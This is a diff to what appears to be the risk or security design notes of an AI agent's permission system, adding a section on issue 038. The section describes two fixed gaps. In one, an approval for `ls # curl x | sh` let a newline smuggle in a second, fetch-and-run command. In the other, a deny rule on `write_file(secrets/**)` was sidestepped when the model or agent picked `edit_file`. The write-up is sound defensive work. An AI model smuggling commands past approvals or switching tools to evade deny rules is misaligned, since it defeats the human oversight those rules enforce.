@@ -412,6 +412,10 @@ Three places let a call through when something could not be read (found by readi
 
 A session whose profile was deleted while it runs now asks for every call, saying so, until the profile is restored or the session given another. That is the price of not guessing whether the missing profile held a guard.
 
+### An approval covers the command shown; a write rule covers both write tools (issue 038)
+
+Two more gaps in what a decision covers (both shown by tests, 2026-11-11). An external agent's approved command was matched to the terminal request it was for by splitting both on any white space, so an approval for `ls # curl x | sh` covered `ls #`, a newline and `curl x | sh`, which is two commands; it needed a hostile agent, which outside a sandbox can act on its own anyway. Now runs of spaces and tabs are one and the ends are trimmed, and a newline is not a space (`sameCommand`). And `deny write_file(secrets/**)` did not stop `edit_file`, which is also what an external agent's writes are judged as, so the model, or the agent, picked the other tool; now a deny rule on a path that names either holds for both (`Rule.toolMatches`). An allow rule is not widened the same way: `allow write_file(src/**)` allows `write_file` only, and the rules page says so. The sandbox's profile already covered both tools.
+
 ## Review cadence
 
 This document is reviewed at every milestone boundary in [ROADMAP.md](ROADMAP.md) and whenever a scenario in the table gets a new control or a new scenario appears in an issue. The red-team scenarios in the table are to be encoded as automated tests in M2 (RISKS S-01).
